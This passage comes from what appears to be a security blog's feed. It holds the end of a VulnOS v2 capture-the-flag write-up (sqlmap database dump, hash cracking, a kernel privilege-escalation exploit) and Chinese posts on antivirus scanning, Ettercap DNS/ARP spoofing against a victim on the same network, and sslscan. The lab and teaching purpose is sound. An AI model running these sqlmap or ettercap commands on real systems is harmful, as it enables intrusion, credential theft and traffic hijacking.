+OS details: Linux 3.2 - 4.4
+Network Distance: 1 hop
+Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&amp;gt;
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.64 ms 192.168.0.100
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 80.84 seconds
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So there is ssh, a webserver and a IRC server.&lt;/p&gt;
+
+&lt;p&gt;On the webserver we get a link to /jabc, I spider this site, browse around a
+bit, and find something interesting in /jabc/?q=node/8&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;p&amp;gt;&amp;lt;span style=&quot;color:#000000&quot;&amp;gt;For security reasons, this section is hidden.&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;&amp;lt;span style=&quot;color:#000000&quot;&amp;gt;For a detailed view and documentation of our products, please visit our documentation platform at /jabcd0cs/ on the server. Just login with guest/guest&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We follow along to /jabcd0cs/&lt;/p&gt;
+
+&lt;p&gt;Here we find OpenDocMan 1.2.7, seeing the copyright for this version only goes
+to 2013 I go to exploit db to see if there are any exploits.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.exploit-db.com/exploits/32075/
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So there is SqL-injection possible in the add_value parameter, I fire sqlmap and
+it and it gets some nice results.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u 'http://192.168.0.100/jabcd0cs/ajax_udf.php?q=1&amp;amp;add_value=odm_user'
+-p add_value -D jabcd0cs --dump
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We get the hash for the webmin user.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Database: jabcd0cs
+Table: odm_user
+[3 entries]
++----+--------------+--------------------+--------------+------------------------------------------+-----------+------------+------------+---------------+
+| id | phone        | Email              | username     | password                                 | last_name | first_name | department | pw_reset_code |
++----+--------------+--------------------+--------------+------------------------------------------+-----------+------------+------------+---------------+
+| 1  | 5555551212   | webmin@example.com | webmin       | b78aae356709f8c31118ea613980954b         | min       | web        | 2          | &amp;lt;blank&amp;gt;       |
+| 2  | 555 5555555  | guest@example.com  | guest        | 084e0343a0486ff05530df6c705c8bb4 (guest) | guest     | guest      | 2          | NULL          |
+| 3  | 555-555-0199 | winter@example.com | Peter+Winter | 3d5bfcc2c4c3101c754087120572aaf7         | Winter    | Peter      | 1          | NULL          |
++----+--------------+--------------------+--------------+------------------------------------------+-----------+------------+------------+---------------+
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I paste this hash into the google and get back the plaintext.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;result: webmin1980
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We can ssh in as this user.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh webmin@192.168.0.100                                                                                                                                                                                                 ⏎
+webmin@192.168.0.100's password:
+Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)
+
+* Documentation:  https://help.ubuntu.com/
+
+ System information as of Tue May 17 08:49:07 CEST 2016
+
+ System load: 0.0               Memory usage: 4%   Processes:       63
+ Usage of /:  5.7% of 29.91GB   Swap usage:   0%   Users logged in: 0
+
+ Graph this data and manage this system at:
+   https://landscape.canonical.com/
+
+Last login: Wed May  4 10:41:07 2016
+$ id
+uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I get a shell on the server and do some recon, after not finding anything for a
+while I notice:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webmin@VulnOSv2:~$ uname -a
+Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I go to kernel-exploits to check if this kernel is vulnerable to anything, and
+it is! There is even a precompiled exploit for us.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.kernel-exploits.com/exploit/39/
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I copy it into webmins hope directory and…&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webmin@VulnOSv2:~$ chmod +x ofs_32
+webmin@VulnOSv2:~$ ./ofs_32
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(webmin)
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Yay!&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# cat /root/flag.txt
+Hello and welcome.
+You successfully compromised the company &quot;JABC&quot; and the server completely !!
+Congratulations !!!
+Hope you enjoyed it.
+
+What do you think of A.I.?
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Good challenge, I liked exploring the sites looking for vulns, thanks to Vulnhub
+for hosting and thanks to c4b3rw0lf for creating it!&lt;/p&gt;</content><author><name></name></author><summary type="html">VulnOS是人为打包的带漏洞的操作系统镜像，用来测试渗透技能。</summary></entry><entry><title type="html">关于杀毒软件</title><link href="topspeedsnail.com/antivirus-software-working/" rel="alternate" type="text/html" title="关于杀毒软件" /><published>2016-05-18T00:00:00+00:00</published><updated>2016-05-18T00:00:00+00:00</updated><id>topspeedsnail.com/antivirus-software-working</id><content type="html" xml:base="topspeedsnail.com/antivirus-software-working/">&lt;p&gt;在Windows系统中最重要最基本的一个软件就是杀毒软件，它可以保护你远离恶意软件。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;关于天朝的免费杀毒软件：“开机看到电脑已经安装xx杀毒，已经不是第一次了。从没见过这么恶心的软件”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;现在每天都有新的病毒出现，而这些病毒大多数是利益驱动－盗取个人信息、敲诈等等。例如，攻击者加密你电脑中重要的文件，然后要求你付款购买密码，What an asshole！&lt;/p&gt;
+
+&lt;h3 id=&quot;恶意软件的主要传播方式&quot;&gt;恶意软件的主要传播方式：&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;被感染的网站&lt;/li&gt;
+  &lt;li&gt;邮件&lt;/li&gt;
+  &lt;li&gt;在线下载文件&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;大多数中毒都是因为用户自己的操作：打开恶意邮件附件，从网上下载文件。&lt;/p&gt;
+
+&lt;h1 id=&quot;杀毒软件扫描病毒的方式&quot;&gt;杀毒软件扫描病毒的方式&lt;/h1&gt;
+
+&lt;p&gt;杀毒软件一般使用三种方式扫描病毒：全盘扫描、快速扫描和实时扫描。&lt;/p&gt;
+
+&lt;h3 id=&quot;全盘扫描&quot;&gt;全盘扫描&lt;/h3&gt;
+
+&lt;p&gt;全盘扫描扫描整个硬盘和系统内存，由于现在的系统文件特别多，所以全盘扫描需要很长时间并占用大量系统资源。&lt;/p&gt;
+
+&lt;h3 id=&quot;快速扫描&quot;&gt;快速扫描&lt;/h3&gt;
+
+&lt;p&gt;快速扫描只扫描启动项、系统内存和启动扇区，有些杀毒软件还会扫描流行病毒所在的目录。快速扫描用时短，你可以在任何时候执行这个操作。&lt;/p&gt;
+
+&lt;h3 id=&quot;实时扫描&quot;&gt;实时扫描&lt;/h3&gt;
+
+&lt;p&gt;实时扫描又叫实时保护，是杀毒软件最重要的扫描机制。每当有软件运行，文件打开／下载，杀毒软件都会扫描这些文件。&lt;/p&gt;
+
+&lt;p&gt;实时扫描最大的优势是它可以检测到应用程序中的安全隐患。&lt;/p&gt;
+
+&lt;h1 id=&quot;杀毒软件检测病毒的方式&quot;&gt;杀毒软件检测病毒的方式&lt;/h1&gt;
+
+&lt;h3 id=&quot;使用病毒库&quot;&gt;使用病毒库&lt;/h3&gt;
+
+&lt;p&gt;病毒库中包含了很多病毒的定义，也可以说是病毒的指纹。通过和你系统中的文件做对比，来判断某个文件是不是病毒。&lt;/p&gt;
+
+&lt;p&gt;因为每天都出现新的病毒，所以病毒库一天可能更新好几次。&lt;/p&gt;
+
+&lt;h3 id=&quot;启发式检测&quot;&gt;启发式检测&lt;/h3&gt;
+
+&lt;p&gt;启发式检测是为了对付病毒的变种，也是为了弥补病毒库的滞后。它根据已知的病毒指纹检测病毒的变种。&lt;/p&gt;
+
+&lt;p&gt;启发式检测并不能保证100%可靠，有可能出现误报。有些杀毒软件认为一个文件是病毒，有些杀毒软件则认为不是。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;国际知名杀毒软件：Bitdefender、ESET、诺顿、卡巴斯基、F-Secure。&lt;/p&gt;</content><author><name></name></author><summary type="html">在Windows系统中最重要最基本的一个软件就是杀毒软件，它可以保护你远离恶意软件。</summary></entry><entry><title type="html">演示DNS欺骗攻击</title><link href="topspeedsnail.com/DNS-spoofing-attack/" rel="alternate" type="text/html" title="演示DNS欺骗攻击" /><published>2016-05-18T00:00:00+00:00</published><updated>2016-05-18T00:00:00+00:00</updated><id>topspeedsnail.com/DNS-spoofing-attack</id><content type="html" xml:base="topspeedsnail.com/DNS-spoofing-attack/">&lt;p&gt;DNS欺骗攻击基于&lt;a href=&quot;http://topspeedsnail.com/kali-linux-preform-man-in-middle-attack/&quot;&gt;中间人攻击&lt;/a&gt;。攻击者更改受害者从DNS服务器查询的域名解析结果，给受害者发送恶意网页或钓鱼网页－浏览器依然显示正常的url。&lt;/p&gt;
+
+&lt;p&gt;本帖介绍怎么使用Ettercap施行DNS欺骗攻击，实现受害者访问任何网站都转向到攻击者指定的网站。&lt;/p&gt;
+
+&lt;h3 id=&quot;情形描述&quot;&gt;情形描述&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;同一局域网内&lt;/li&gt;
+  &lt;li&gt;受害者IP：192.168.0.106&lt;/li&gt;
+  &lt;li&gt;攻击者系统Kali Linux，IP地址：192.168.0.108&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;创建恶搞网站&quot;&gt;创建恶搞网站&lt;/h2&gt;
+
+&lt;p&gt;在Kali Linux上创建恶搞网站。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;启动Apache：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# service apache2 start&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;创建恶搞网页：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# vim /var/www/html/index.html&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;写入内容：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;h1&amp;gt;You Got Fucked!&amp;lt;/h1&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;你可以测试一下（http://192.168.0.108），看看Web是否可以正常提供服务。&lt;/p&gt;
+
+&lt;h2 id=&quot;dns欺骗攻击&quot;&gt;DNS欺骗攻击&lt;/h2&gt;
+
+&lt;p&gt;编辑文件：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# vim /etc/ettercap/etter.dns&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;在文件中添加一行：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;* A 192.168.0.108
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;所有域名查询都解析为Kali Linux的IP地址。&lt;/p&gt;
+
+&lt;p&gt;DNS欺骗／ARP欺骗：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# ettercap -i wlan0 -T -P dns_spoof -M arp /192.168.0.106///&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screenshot from 2016-05-18 18-37-15.png&quot; alt=&quot;演示DNS欺骗攻击&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;测试&quot;&gt;测试&lt;/h2&gt;
+
+&lt;p&gt;受害者访问网站：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screen Shot 2016-05-18 at 18.42.13.png&quot; alt=&quot;演示DNS欺骗攻击&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;注意：地址栏的URL并没有变&lt;/p&gt;
+
+&lt;p&gt;你也可以使用nslookup命令查询DNS解析结果：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nslookup www.baidu.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Kali Linux中另一个执行这种攻击的工具：dnsspoof。&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# man dnsspoof&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><author><name></name></author><summary type="html">DNS欺骗攻击基于中间人攻击。攻击者更改受害者从DNS服务器查询的域名解析结果，给受害者发送恶意网页或钓鱼网页－浏览器依然显示正常的url。</summary></entry><entry><title type="html">使用sslscan获得SSL/TLS信息</title><link href="topspeedsnail.com/use-sslscan-get-ssl-info/" rel="alternate" type="text/html" title="使用sslscan获得SSL/TLS信息" /><published>2016-05-17T00:00:00+00:00</published><updated>2016-05-17T00:00:00+00:00</updated><id>topspeedsnail.com/use-sslscan-get-ssl-info</id><content type="html" xml:base="topspeedsnail.com/use-sslscan-get-ssl-info/">&lt;p&gt;SSLscan主要探测基于ssl的服务，如https。SSLscan是一款探测目标服务器所支持的SSL加密算法工具。&lt;/p&gt;
+
+&lt;p&gt;SSlscan的代码托管在&lt;a href=&quot;https://github.com/DinoTools/sslscan&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;SSLScan queries SSL services, such as HTTPS, in order to determine the ciphers that are supported. SSLScan is designed to be easy, lean and fast. The output includes preferred ciphers of the SSL service, the certificate and is in Text and XML formats.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;使用HTTPS可以防止中间人攻击，但是只有当配置正确并使用强加密才行。&lt;/p&gt;
+
+&lt;p&gt;关于SSL协议的漏洞也爆出了不少。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;使用示例：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# sslscan your_target&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screen Shot 2016-05-18 at 09.25.10.png&quot; alt=&quot;使用sslscan获得SSL/TLS信息&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Heartbleed是TLS实现上的一个漏洞，2014年4月爆出。更多信息：&lt;a href=&quot;https://en.wikipedia.org/wiki/Heartbleed&quot;&gt;https://en.wikipedia.org/wiki/Heartbleed&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screen Shot 2016-05-18 at 09.28.41.png&quot; alt=&quot;使用sslscan获得SSL/TLS信息&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上图显示服务器支持的加密算法，红字认为是不那么安全的加密算法，黄字中等安全。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2016/5/Screen Shot 2016-05-18 at 09.32.57.png&quot; alt=&quot;使用sslscan获得SSL/TLS信息&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;SSL证书信息，RSA key的长度建议是2048 bit。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Kali Linux中还有一个叫SSLyze的工具，配合sslscan获得更多信息：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# sslyze --regular your_target&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;SSL/TLS信息也可以用OpenSSL命令获得：&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# openssl s_client -connect your_target:443&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;基于sslscan的工具：TLSSLed&lt;/p&gt;
+
+&lt;p&gt;它是一个Linux shell脚本,它的功能是测试目标SSL/TLS(HTTPS)WEB 服务器的安全性。&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;c&quot;&gt;# tlssled your_target 443&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><author><name></name></author><summary type="html">SSLscan主要探测基于ssl的服务，如https。SSLscan是一款探测目标服务器所支持的SSL加密算法工具。</summary></entry></feed>
